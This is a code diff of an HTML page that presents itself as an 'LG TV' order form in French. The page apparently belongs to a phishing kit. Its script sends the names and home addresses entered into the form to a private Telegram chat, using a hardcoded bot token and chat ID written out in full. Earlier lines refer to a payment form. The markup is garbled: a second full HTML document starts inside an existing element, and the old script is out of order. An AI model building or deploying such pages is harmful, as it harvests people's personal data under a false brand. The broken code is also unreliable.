@@ -390,108 +390,17 @@
     </div>
 
     <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Commande - LG TV</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    <style>
-        /* تنسيقات الصفحة */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f9f9f9;
-            color: #333;
-        }
-        .navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 20px;
-            background-color: #c70000;
-        }
-        .navbar .logo {
-            font-size: 1.5rem;
-            color: #fff;
-            font-weight: bold;
-        }
-        .navbar ul {
-            list-style: none;
-            display: flex;
-            gap: 15px;
-        }
-        .navbar ul li a {
-            text-decoration: none;
-            color: #fff;
-            font-size: 1rem;
-            transition: color 0.3s;
-        }
-        .navbar ul li a:hover {
-            color: #ffecec;
-        }
-        .container {
-            max-width: 800px;
-            margin: 20px auto;
-            padding: 20px;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-        }
-        .form-group input:focus {
-            border-color: #c70000;
-        }
-        .form-group button {
-            width: 100%;
-            padding: 10px;
-            background-color: #c70000;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 1rem;
-            cursor: pointer;
-        }
-        .form-group button:hover {
-            background-color: #a50000;
-        }
-        footer {
-            background-color: #2c3e50;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-    </style>
+    <title>Formulaire de Commande</title>
 </head>
 <body>
-    <!-- Navigation -->
-    <div class="navbar">
-        <div class="logo">LG TV</div>
-        <ul>
-            <li><a href="#">Accueil</a></li>
-            <li><a href="#">Produits</a></li>
-            <li><a href="#">Contact</a></li>
-        </ul>
-    </div>
-
     <!-- Formulaire -->
     <div class="container">
         <h2>Remplissez vos informations</h2>
-        <form id="order-form" action="page-livraison1.html" method="GET">
+        <form id="order-form">
             <div class="form-group">
                 <label for="prenom">Prénom *</label>
                 <input type="text" id="prenom" name="prenom" required placeholder="Entrez votre prénom">
@@ -506,7 +415,7 @@
             </div>
             <div class="form-group">
                 <label for="numero">N°</label>
-                <input type="tel" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
+                <input type="text" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
             </div>
             <div class="form-group">
                 <label for="code_postal">Code postal *</label>
@@ -522,18 +431,13 @@
         </form>
     </div>
 
+    <script>
         // Fonction pour envoyer les informations au bot Telegram
-        document.getElementById('payment-form').addEventListener('submit', async function(e) {
-            e.preventDefault(); // Eviter l'envoi du formulaire
+        document.getElementById('order-form').addEventListener('submit', async function (e) {
+            e.preventDefault(); // Empêche l'envoi du formulaire par défaut
 
-            🌟 طلب جديد 🌟
-                👤 الاسم: ${data.nom} ${data.prenom}
-                🏠 العنوان: ${data.rue}, رقم: ${data.numero}, ${data.ville} (${data.code_postal})
-            `;
-
-            // Créez un message à envoyer
-            const message = `
-const data = {
+            // Récupération des données du formulaire
+            const data = {
                 prenom: document.getElementById("prenom").value,
                 nom: document.getElementById("nom").value,
                 rue: document.getElementById("rue").value,
@@ -542,22 +446,33 @@ const data = {
                 ville: document.getElementById("ville").value,
             };
 
-            const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
-            const chatId = '5372119436'; // Votre chat ID Telegram
+            // Création du message à envoyer
+            const message = `
+🌟 طلب جديد 🌟
+👤 الاسم: ${data.nom} ${data.prenom}
+🏠 العنوان: ${data.rue}, رقم: ${data.numero}, ${data.ville} (${data.code_postal})
+            `;
 
+            // Informations sur le bot Telegram
+            const botToken = '8101158488:AAH6WIfCC6b6aGkWd_Tt6QRrWD8QKQQc69M'; // Remplacez par votre token
+            const chatId = '5372119436'; // Remplacez par votre ID de chat
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
-            // Envoi du message
-            const response = await fetch(telegramApiUrl);
-            const dataResponse = await response.json();
+            // Envoi du message via fetch
+            try {
+                const response = await fetch(telegramApiUrl);
+                const dataResponse = await response.json();
 
-            if (dataResponse.ok) {
-                alert('Votre paiement a été envoyé avec succès.');
-            } else {
-                alert('Erreur dans l\'envoi des informations.');
+                if (dataResponse.ok) {
+                    alert('Votre commande a été envoyée avec succès.');
+                } else {
+                    alert('Erreur dans l\'envoi des informations.');
+                }
+            } catch (error) {
+                alert('Une erreur est survenue : ' + error.message);
             }
         });
     </script>
-
 </body>
 </html>
+
